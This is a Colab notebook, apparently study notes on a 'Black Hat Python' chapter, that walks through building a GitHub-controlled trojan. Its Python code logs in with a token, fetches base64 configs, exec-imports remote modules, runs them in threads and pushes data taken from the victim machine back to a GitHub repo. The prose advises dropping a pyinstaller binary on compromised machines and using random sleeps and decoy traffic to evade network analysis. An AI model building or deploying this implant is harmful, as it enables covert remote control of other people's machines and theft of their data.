{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOu19vzvFJC/lmIH0Yjzyor",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C7-Github_Command_And_Control/Building_A_Github_Aware_Trojan.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Building a Github-Aware Trojan__*\n",
        "\n",
        "The main trojan will retrieve configuration options and code to run from Github. Let's start by writing the functions that connect and authenticate to the Github API and then communicate with it. Open a new file called __git_trojan.py__ and enter the following:"
      ],
      "metadata": {
        "id": "OyvLc487Wpl1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import base64\n",
        "import github3\n",
        "import importlib\n",
        "import json\n",
        "import random\n",
        "import sys\n",
        "import threading\n",
        "import time\n",
        "\n",
        "from datetime import datetime"
      ],
      "metadata": {
        "id": "JwM2uWWQXBCm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This simple setup code contains the necessary imports, which should keep our overall trojan size relatively small when compiled. We say __relatively__ because most compiled Python binaries using __pyinstaller__ are around __7MB__. (You can check out __pyinstaller__ here: https://www.pyinstaller.org/downloads.html). We'll drop this binary on the compromised machine.\n",
        "\n",
        "If you were to explode this technique to build a full __botnet__ (a network of many such implants), you'd want the ability to automatically generate trojans, set their ID, create a configuration file that's pushed to Github, and compile the trojan into an executable. We won't build a botnet today, though; we'll let your imagination do the work.\n",
        "\n",
        "Now let's put the relevant Github code in place:"
      ],
      "metadata": {
        "id": "tj6Z-ulRXVLT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def github_connect(): #[1]\n",
        "    with open('mytoken.txt') as f:\n",
        "        token = f.read()\n",
        "    user = 'tiarno'\n",
        "    sess = github3.login(token=token)\n",
        "    return sess.repository(user, 'bhptrojan')\n",
        "\n",
        "def get_file_contents(dirname, module_name, repo): #[2]\n",
        "    return repo.file_contents(f'{dirname}/{module_name}').content"
      ],
      "metadata": {
        "id": "74BBUIMlYcMH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "These two functions handle the interaction with the Github repository. The __github_connect__ function reads the token created on Github __[1]__. When you created the token, you wrote it to a file called __mytoken.txt__. Now we read the token from that file and return a connection to the Github repository. You may want to create different tokens for different trojans so you can control what each trojan can access in your repository. That way, if victims catch your trojan, they can't come along and delete all of your retrieved data.\n",
        "\n",
        "The __get_file_contents__ function receives the directory name, module name, and repository connection and returns the contents of the specified module __[2]__. This function is responsible for grabbing files from the remote repo and reading the contents in locally. We'll use it for reading both configuration options and the module source code.\n",
        "\n",
        "Now we will create a __Trojan__ class that performs the essential trojaning tasks:"
      ],
      "metadata": {
        "id": "ZwohheNWZRJj"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Trojan:\n",
        "    def __init__(self, id): #[1]\n",
        "        self.id = id\n",
        "        self.config_file = f'{id}.json'\n",
        "        self.data_path = f'data/{id}/' #[2]\n",
        "        self.repo = github_connect() #[3]"
      ],
      "metadata": {
        "id": "WCo4BniUbA6K"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "When we initialize the Trojan object __[1]__, we assign its configuration information and the data path where the trojan will write its output files __[2]__, and we make the connection to the repository __[3]__. Now we'll add the methods we'll need to communicate with it:"
      ],
      "metadata": {
        "id": "q4mOU3U2JJXf"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def get_config(self): #[1]\n",
        "    config_json = get_file_contents('config', self.config_file, self.repo)\n",
        "    config = json.loads(base64.b64decode(config_json))\n",
        "\n",
        "    for task in config:\n",
        "        if task['module'] not in sys.modules:\n",
        "            exec('import %s' % task['module']) #[2]\n",
        "    return config\n",
        "\n",
        "def module_runner(self, module): #[3]\n",
        "    result = sys.modules[module].run()\n",
        "    self.store_module_result(result)\n",
        "\n",
        "def store_module_result(self, data): #[4]\n",
        "    message = datetime.now().isoformat()\n",
        "    remote_path = f'data/{self.id}/{message}.data'\n",
        "    bindata = bytes('%r' % data, 'utf-8')\n",
        "    self.repo.create_file(remote_path, message, base64.b64encode(bindata))\n",
        "\n",
        "def run(self): #[5]\n",
        "    while True:\n",
        "        config = self.get_config()\n",
        "        for task in config:\n",
        "            thread = threading.Thread(\n",
        "                target=self.module_runner, args=(task['module'],)\n",
        "            )\n",
        "            thread.start()\n",
        "            time.sleep(random.randint(1, 10))\n",
        "\n",
        "        time.sleep(random.randint(30 * 60, 3 * 60 * 60)) #[6]"
      ],
      "metadata": {
        "id": "vpr39m8CKAD9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The __get_config__ method __[1]__ retrieves the remote configuration document from the repo so that your trojan knows which modules to run. The __exec__ call brings the module content into the trojan object __[2]__. The __module_runner__ method calls the __run__ function of the module just imported __[3]__. We'll go into more detail on how it gets called in the next section. And the __store_module_result__ method __[4]__ creates a file whose name includes the current date and time and then saves its output into that file. The trojan will use these three methods to push any data collected from the target machine to Github.\n",
        "\n",
        "In the __run__ method __[5]__, we start executing these tasks. The first step is to grab the configuration file from the repo. Then we kick off the module in its own thread. While in the __module_runner__ method, we call the module's __run__ function to run its code. When it's done running, it should output a string that we then push to our repo.\n",
        "\n",
        "When it finishes a task, the trojan will sleep for a random amount of time in an attempt to foil any network-pattern analysis __[6]__. You could, of course, create a bunch of traffic to google.com, or any number of other sites that appear benign, in an attempt to disguise what your trojan is up yo.\n",
        "\n",
        "Now let's create an import hack to import remote files from the Github repo."
      ],
      "metadata": {
        "id": "G4tNA-coNkHH"
      }
    }
  ]
}